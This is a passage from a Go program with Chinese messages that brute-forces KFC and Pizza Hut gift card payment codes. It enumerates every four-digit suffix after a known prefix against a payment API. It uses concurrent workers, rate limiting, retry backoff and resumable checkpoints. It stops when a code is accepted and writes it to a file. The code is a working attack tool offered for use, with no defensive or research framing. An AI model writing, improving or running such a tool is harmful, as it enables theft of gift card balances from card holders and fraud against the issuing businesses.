			fmt.Printf("[%s] 尝试 %d 次后仍无法确定，保留为待复核: %s\n", job.Suffix, job.Attempts, result.Message)
			return false, false, false, nil
		}

		job.NextAttemptAt = next
		event := makeEvent(job, StateRetryWait, result, next)
		if err := persistEvent(store, records, event, false); err != nil {
			return false, false, false, err
		}
		heap.Push(retries, job)
		fmt.Printf("[%s] %s，将在 %s 后重试（累计 %d 次）\n", job.Suffix, result.Message, delay.Round(time.Millisecond), job.Attempts)
		return false, false, false, nil
	default:
		return false, false, false, fmt.Errorf("未知请求决策: %q", result.Decision)
	}
}

func countStates(records map[string]ProgressEvent) StateCounts {
	counts := StateCounts{}
	for _, suffix := range candidateSuffixes() {
		event, ok := records[suffix]
		if !ok {
			counts.Pending++
			continue
		}
		switch event.State {
		case StateVerifiedInvalid:
			counts.Invalid++
		case StateFound:
			counts.Found++
		case StateInFlight:
			counts.InFlight++
		case StateRetryWait:
			counts.Retrying++
		case StateReviewRequired:
			counts.Review++
		case StateRunBlocked:
			counts.Blocked++
		default:
			counts.Pending++
		}
	}
	counts.Unresolved = counts.Pending + counts.InFlight + counts.Retrying + counts.Review + counts.Blocked
	return counts
}

func runScheduler(
	parent context.Context,
	fresh []Job,
	retries jobHeap,
	records map[string]ProgressEvent,
	store *progressStore,
) (ScanOutcome, error) {
	ctx, cancel := context.WithCancel(parent)
	jobs := make(chan Job, cfg.Threads)
	results := make(chan WorkerResult, cfg.Threads)
	var wg sync.WaitGroup
	startWorkers(ctx, cfg.Threads, jobs, results, &wg)
	defer func() {
		cancel()
		close(jobs)
		wg.Wait()
	}()

	progressTicker := time.NewTicker(5 * time.Second)
	defer progressTicker.Stop()
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	interval := requestInterval(cfg.RequestsPerSecond)
	nextDispatch := time.Time{}
	globalNotBefore := time.Time{}
	if runEvent, ok := records[runStateKey]; ok && runEvent.State == StateRunCooldown && runEvent.NextAttemptAt.After(time.Now()) {
		globalNotBefore = runEvent.NextAttemptAt
	}
	freshIndex := 0
	freshSinceRetry := 0
	if retries.Len() > 0 && !retries[0].NextAttemptAt.After(time.Now()) {
		freshSinceRetry = newJobsPerRetry
	}
	inFlight := 0
	started := time.Now()
	initialCounts := countStates(records)
	initialConfirmed := initialCounts.Invalid + initialCounts.Found

	for {
		if freshIndex >= len(fresh) && retries.Len() == 0 && inFlight == 0 {
			return ScanOutcome{}, nil
		}

		now := time.Now()
		canDispatch := inFlight < cfg.Threads && !globalNotBefore.After(now) && !nextDispatch.After(now)
		dueRetry := retries.Len() > 0 && !retries[0].NextAttemptAt.After(now)
		if canDispatch {
			var job Job
			haveJob := false
			if dueRetry && (freshIndex >= len(fresh) || freshSinceRetry >= newJobsPerRetry) {
				job = heap.Pop(&retries).(Job)
				freshSinceRetry = 0
				haveJob = true
			} else if freshIndex < len(fresh) {
				job = fresh[freshIndex]
				freshIndex++
				freshSinceRetry++
				haveJob = true
			} else if dueRetry {
				job = heap.Pop(&retries).(Job)
				freshSinceRetry = 0
				haveJob = true
			}

			if haveJob {
				job.Attempts++
				leaseUntil := now.Add(time.Duration(cfg.RequestTimeout+5) * time.Second)
				inFlightEvent := makeEvent(job, StateInFlight, AttemptResult{}, leaseUntil)
				if err := persistEvent(store, records, inFlightEvent, true); err != nil {
					return ScanOutcome{}, fmt.Errorf("保存 in-flight 状态失败: %w", err)
				}
				jobs <- job
				inFlight++
				if interval > 0 {
					nextDispatch = now.Add(interval)
				}
				continue
			}
		}

		var wakeAt time.Time
		if inFlight < cfg.Threads {
			if globalNotBefore.After(now) {
				wakeAt = globalNotBefore
			} else if nextDispatch.After(now) {
				wakeAt = nextDispatch
			} else if freshIndex >= len(fresh) && retries.Len() > 0 {
				wakeAt = retries[0].NextAttemptAt
			}
		}

		var timer *time.Timer
		var timerChannel <-chan time.Time
		if !wakeAt.IsZero() {
			delay := time.Until(wakeAt)
			if delay < 0 {
				delay = 0
			}
			timer = time.NewTimer(delay)
			timerChannel = timer.C
		}

		select {
		case <-parent.Done():
			stopTimer(timer)
			return ScanOutcome{Canceled: true}, nil

		case workerResult := <-results:
			stopTimer(timer)
			inFlight--
			found, blocked, canceled, err := handleWorkerResult(workerResult, &retries, records, store, rng, &globalNotBefore)
			if err != nil {
				return ScanOutcome{}, err
			}
			if found {
				return ScanOutcome{Found: true, FoundCode: cfg.PaymentPrefix + workerResult.Job.Suffix}, nil
			}
			if blocked {
				return ScanOutcome{Blocked: true}, nil
			}
			if canceled {
				return ScanOutcome{Canceled: true}, nil
			}

		case <-progressTicker.C:
			stopTimer(timer)
			counts := countStates(records)
			elapsed := time.Since(started).Seconds()
			confirmed := counts.Invalid + counts.Found
			rate := 0.0
			if elapsed > 0 {
				rate = float64(confirmed-initialConfirmed) / elapsed
			}
			fmt.Printf("\n--- 确定结果 %d/%d | 请求中 %d | 待重试 %d | 待复核 %d | 未开始 %d | %.1f confirmed/s ---\n\n",
				confirmed, totalCandidates, counts.InFlight, counts.Retrying, counts.Review, counts.Pending, rate)

		case <-timerChannel:
			// 返回循环重新计算可分发任务。
		}
	}
}

func applyDefaults(config *Config) error {
	if config.Threads == 0 {
		config.Threads = 20
	}
	if config.RetryWait == 0 {
		config.RetryWait = 3
	}
	if config.RetryMaxWait == 0 {
		config.RetryMaxWait = 60
	}
	if config.MaxAttempts == 0 {
		config.MaxAttempts = 20
	}
	if config.RequestsPerSecond == 0 {
		config.RequestsPerSecond = 10
	}
	if config.RequestTimeout == 0 {
		config.RequestTimeout = 15
	}
	if config.CheckpointFile == "" {
		config.CheckpointFile = "progress.jsonl"
	}

	if config.Threads < 1 || config.Threads > 100 {
		return fmt.Errorf("threads 必须在 1~100 之间")
	}
	if config.MaxRetry < 0 {
		return fmt.Errorf("maxRetry 不能为负数")
	}
	if config.RetryWait < 1 || config.RetryMaxWait < config.RetryWait || config.RetryMaxWait > 86400 {
		return fmt.Errorf("retryWait 必须大于 0，retryMaxWait 必须在 retryWait~86400 之间")
	}
	if config.MaxAttempts < config.MaxRetry+1 {
		return fmt.Errorf("maxAttempts 必须至少为 maxRetry+1")
	}
	if config.ReviewRevision < 0 {
		return fmt.Errorf("reviewRevision 不能为负数")
	}
	if config.RequestsPerSecond < 0.01 || config.RequestsPerSecond > 10000 {
		return fmt.Errorf("requestsPerSecond 必须在 0.01~10000 之间")
	}
	if config.RequestTimeout < 1 || config.RequestTimeout > 3600 {
		return fmt.Errorf("requestTimeout 必须在 1~3600 秒之间")
	}
	if strings.TrimSpace(config.CardSequence) == "" || strings.TrimSpace(config.PaymentPrefix) == "" || strings.TrimSpace(config.Token) == "" {
		return fmt.Errorf("cardSequence、paymentPrefix 和 token 均不能为空")
	}
	if strings.TrimSpace(config.FullURL) == "" || strings.TrimSpace(config.ClientKey) == "" || strings.TrimSpace(config.ClientSec) == "" {
		return fmt.Errorf("fullUrl、clientKey 和 clientSec 均不能为空")
	}
	return nil
}

func configureHTTPClient() {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.MaxIdleConns = cfg.Threads * 2
	transport.MaxIdleConnsPerHost = cfg.Threads
	httpClient = &http.Client{
		Timeout:   time.Duration(cfg.RequestTimeout) * time.Second,
		Transport: transport,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func brandName() string {
	switch cfg.SecretKey {
	case "kfc":
		return "肯德基 KFC"
	case "ph":
		return "必胜客 Pizza Hut"
	default:
		return "未知"
	}
}

func printHeader(fresh int, retry int) {
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("礼品卡 paymentCode 可靠顺序扫描 [%s]\n", brandName())
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("卡号(cardSequence): %s\n", cfg.CardSequence)
	fmt.Printf("密码前缀:           %s\n", cfg.PaymentPrefix)
	fmt.Printf("枚举顺序:           %s0000 -> %s9999\n", cfg.PaymentPrefix, cfg.PaymentPrefix)
	fmt.Printf("新候选:             %d\n", fresh)
	fmt.Printf("恢复的未决候选:     %d\n", retry)
	fmt.Printf("并发数 / 全局速率:  %d / %.2f req/s\n", cfg.Threads, cfg.RequestsPerSecond)
	fmt.Printf("快速重试 / 总尝试:  %d / %d\n", cfg.MaxRetry, cfg.MaxAttempts)
	fmt.Printf("待复核重放版本:     %d\n", cfg.ReviewRevision)
	fmt.Printf("检查点:             %s\n", cfg.CheckpointFile)
	fmt.Println(strings.Repeat("=", 60))
}

func printFinal(status RunStatus, counts StateCounts, elapsed time.Duration) {
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	switch status {
	case RunFound:
		fmt.Printf("完成：已找到确定结果，耗时 %.0fs\n", elapsed.Seconds())
		fmt.Println("结果已保存到 found_payment.txt")
	case RunNotFound:
		fmt.Printf("完成：全部 %d 个候选都得到已知的精确无效码，确定未找到，耗时 %.0fs\n", totalCandidates, elapsed.Seconds())
	case RunBlocked:
		fmt.Printf("扫描暂停：认证或配置需要处理，进度已保存，耗时 %.0fs\n", elapsed.Seconds())
		fmt.Println("修复配置或更新 token 后重新运行即可继续。")
	case RunIncomplete:
		fmt.Printf("扫描未完成：仍有 %d 个未决候选，耗时 %.0fs\n", counts.Unresolved, elapsed.Seconds())
		fmt.Println("待复核项已保留；修复原因并递增 reviewRevision 后可定向重放。")
	case RunCanceled:
		fmt.Printf("用户已中断：仍有 %d 个未决候选，耗时 %.0fs\n", counts.Unresolved, elapsed.Seconds())
		fmt.Println("请求中的候选已带租约写入检查点，租约到期后可安全续跑。")
	}
	fmt.Printf("状态: 已排除=%d, 请求中=%d, 待重试=%d, 待复核=%d, 阻塞=%d, 未开始=%d\n",
		counts.Invalid, counts.InFlight, counts.Retrying, counts.Review, counts.Blocked, counts.Pending)
	fmt.Println(strings.Repeat("=", 60))
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}

func run() (exitCode int) {
	configData, err := os.ReadFile("config.json")
	if err != nil {
		fmt.Printf("读取 config.json 失败: %v\n", err)
		return 1
	}
	if err := json.Unmarshal(configData, &cfg); err != nil {
		fmt.Printf("解析 config.json 失败: %v\n", err)
		return 1
	}
	if err := applyDefaults(&cfg); err != nil {
		fmt.Printf("配置无效: %v\n", err)
		return 1
	}
	configureHTTPClient()
	lock, err := acquireInstanceLock(cfg.CheckpointFile)
	if err != nil {
		fmt.Printf("无法锁定检查点: %v\n", err)
		return 1
	}
	defer func() {
		if err := lock.Release(); err != nil {
			fmt.Printf("释放检查点锁失败: %v\n", err)
			exitCode = 1
		}
	}()

	runKey := runKeyForConfig(cfg)
	if err := repairCheckpointTail(cfg.CheckpointFile); err != nil {
		fmt.Printf("修复检查点尾记录失败: %v\n", err)
		return 1
	}
	records, err := loadProgress(cfg.CheckpointFile, runKey)
	if err != nil {
		fmt.Printf("读取检查点失败: %v\n", err)
		return 1
	}
	fresh, retries, foundSuffix := buildQueues(records)
	if foundSuffix != "" {
		foundEvent := records[foundSuffix]
		if err := writeFoundResult(cfg.PaymentPrefix+foundSuffix, []byte(foundEvent.ResultBody)); err != nil {
			fmt.Printf("从检查点恢复结果文件失败: %v\n", err)
			return 1
		}
		counts := countStates(records)
		printFinal(RunFound, counts, 0)
		fmt.Printf("已记录的密码: %s%s\n", cfg.PaymentPrefix, foundSuffix)
		return 0
	}

	store, err := openProgressStore(cfg.CheckpointFile, runKey)
	if err != nil {
		fmt.Printf("打开检查点失败: %v\n", err)
		return 1
	}

	printHeader(len(fresh), retries.Len())
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	started := time.Now()
	outcome, scanErr := runScheduler(ctx, fresh, retries, records, store)
	closeErr := store.Close()
	if scanErr != nil {
		fmt.Printf("扫描失败: %v\n", scanErr)
		if closeErr != nil {
			fmt.Printf("同时无法同步检查点: %v\n", closeErr)
		}
		return 1
	}
	if closeErr != nil {
		fmt.Printf("同步检查点失败，不能确认最终状态: %v\n", closeErr)
		return 1
	}

	counts := countStates(records)
	status := deriveRunStatus(totalCandidates, counts.Invalid, counts.Unresolved, outcome.Found || counts.Found > 0, outcome.Blocked)
	if outcome.Canceled {
		status = RunCanceled
	}
	printFinal(status, counts, time.Since(started))
	switch status {
	case RunFound:
		return 0
	case RunNotFound:
		return 2
	case RunBlocked:
		return 4
	case RunCanceled:
		return 130
	default:
		return 3
	}
}

func main() {
	os.Exit(run())
}
